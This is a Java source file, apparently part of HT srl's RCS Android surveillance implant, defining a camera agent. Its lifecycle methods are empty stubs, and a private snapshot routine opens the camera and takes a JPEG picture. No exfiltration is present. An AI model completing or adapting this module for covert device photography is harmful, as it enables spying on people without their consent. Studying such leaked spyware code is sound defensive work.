/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : CameraAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.agent;

import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.ShutterCallback;
import android.util.Log;

//SNIPPET
public class CameraAgent extends AgentBase {

	private final String TAG = "CameraAgent";

	@Override
	public void begin() {
		// TODO Auto-generated method stub

	}

	@Override
	public void end() {
		// TODO Auto-generated method stub

	}

	@Override
	public void parse(final byte[] conf) {
		// TODO Auto-generated method stub

	}

	@Override
	public void go() {
		// TODO Auto-generated method stub

	}

	private void snapshot() {

		final ShutterCallback shutterCallback = new ShutterCallback() {

			public void onShutter() {
				Log.d(TAG, "onShutter");
			}
		};
		final PictureCallback rawCallback = new PictureCallback() {
			public void onPictureTaken(final byte[] _data, final Camera _camera) {
				Log.d(TAG, "onPictureTaken RAW");
			}
		};
		final PictureCallback jpegCallback = new PictureCallback() {
			public void onPictureTaken(final byte[] _data, final Camera _camera) {
				Log.d(TAG, "onPictureTaken JPEG");
			}
		};

		final Camera camera = Camera.open();
		final Camera.Parameters parameters = camera.getParameters();
		parameters.setPictureFormat(PixelFormat.JPEG);
		camera.setParameters(parameters);
		camera.takePicture(shutterCallback, rawCallback, jpegCallback);

		camera.release();
	}

}
